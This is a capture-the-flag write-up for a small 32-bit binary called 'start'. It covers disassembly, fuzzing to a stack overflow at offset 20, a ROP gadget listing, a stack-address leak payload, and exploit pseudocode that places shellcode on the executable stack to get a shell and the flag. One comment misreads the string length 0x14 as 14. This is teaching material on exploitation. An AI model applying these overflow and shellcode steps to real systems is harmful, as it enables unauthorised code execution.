reversing
=========

very small program, presumably written in assembly

```sh
08048060 <_start>:
 8048060:       54                      push   esp
 8048061:       68 9d 80 04 08          push   0x804809d // _exit
 8048066:       31 c0                   xor    eax,eax
 8048068:       31 db                   xor    ebx,ebx
 804806a:       31 c9                   xor    ecx,ecx
 804806c:       31 d2                   xor    edx,edx
 804806e:       68 43 54 46 3a          push   0x3a465443 // "CTF:"
 8048073:       68 74 68 65 20          push   0x20656874 // "the "
 8048078:       68 61 72 74 20          push   0x20747261 // "art "
 804807d:       68 73 20 73 74          push   0x74732073 // "s st"
 8048082:       68 4c 65 74 27          push   0x2774654c // "Let'"
 8048087:       89 e1                   mov    ecx,esp   // *string: sp (as we just pushed the string to stack)
 8048089:       b2 14                   mov    dl,0x14   // length of string: 14
 804808b:       b3 01                   mov    bl,0x1  // fd: 1 (stdout)
 804808d:       b0 04                   mov    al,0x4  // system call number 4: write 
 804808f:       cd 80                   int    0x80   // syscall 
 8048091:       31 db                   xor    ebx,ebx // fd: 0 (stdin)
 8048093:       b2 3c                   mov    dl,0x3c  // count: 61
 8048095:       b0 03                   mov    al,0x3 // sycall #3: read
 8048097:       cd 80                   int    0x80 // read(), ecx remains at sp 
 8048099:       83 c4 14                add    esp,0x14
 804809c:       c3                      ret

0804809d <_exit>:
 804809d:       5c                      pop    esp
 804809e:       31 c0                   xor    eax,eax
 80480a0:       40                      inc    eax
 80480a1:       cd 80                   int    0x80
```

pushes each 32bit word of the string onto the stack.
writes 14 byte string to stack
reads 61 bytes of input, grows stack by 0x14


fuzzing
=======

1. check security features -> none
2. spam input -> stack smashed, can overwrite eip
3. gdb pattern scan -> offset 20

```sh
gdb ./start 
pattern create
run 
(input pattern)
pattern search (value in eip after program exits)
```

4. decision: binary doesn't have NX bit set, so if we write our shellcode to the stack and set eip to the address we have RCE

shellcoding
===========

1. searching for rop gadgets:

```
0x0804809b: adc al, 0xc3; pop esp; xor eax, eax; inc eax; int 0x80;
0x08048099: add esp, 0x14; ret;
0x080480a0: inc eax; int 0x80;
0x0804808f: int 0x80;
0x08048097: int 0x80; add esp, 0x14; ret;
0x08048085: je 0xae; mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
0x0804809a: les edx, ptr [ebx + eax*8]; pop esp; xor eax, eax; inc eax; int 0x80;
0x08048095: mov al, 3; int 0x80;
0x08048095: mov al, 3; int 0x80; add esp, 0x14; ret;
0x0804808d: mov al, 4; int 0x80;
0x0804808b: mov bl, 1; mov al, 4; int 0x80;
0x08048089: mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80;
0x08048093: mov dl, 0x3c; mov al, 3; int 0x80;
0x08048093: mov dl, 0x3c; mov al, 3; int 0x80; add esp, 0x14; ret;
0x08048087: mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80; .
0x0804809d: pop esp; xor eax, eax; inc eax; int 0x80;
0x08048090: xor byte ptr [ecx], 0xdb; mov dl, 0x3c; mov al, 3; int 0x80;
0x08048090: xor byte ptr [ecx], 0xdb; mov dl, 0x3c; mov al, 3; int 0x80; add esp, 0x14; ret;
0x0804809e: xor eax, eax; inc eax; int 0x80;
0x08048091: xor ebx, ebx; mov dl, 0x3c; mov al, 3; int 0x80;
0x08048091: xor ebx, ebx; mov dl, 0x3c; mov al, 3; int 0x80; add esp, 0x14; ret;
0x08048086: daa; mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80; 
0x0804809c: ret;

23 gadgets found
```

2. the gadgets at 0x8048087 and x8048086 print esp, which is what we want

```
echo -ne "AAAAAAAAAAAAAAAAAAAA\x87\x80\x04\x08" > shellcode
gdb ./start
run < shellcode
```

3. running throught netcat, it seems aslr is enabled on the server so we need to use our gadget at exploit-time

our exploit should look like this

```
stack = (int)send((padding + le(0x8048087))
send(padding + stack+len(padding) + shellcode)
```

after getting reverse shell using [this](https://shell-storm.org/shellcode/files/shellcode-827.html) shellcode from Hamza Megahed the flag can be found in /home/start!






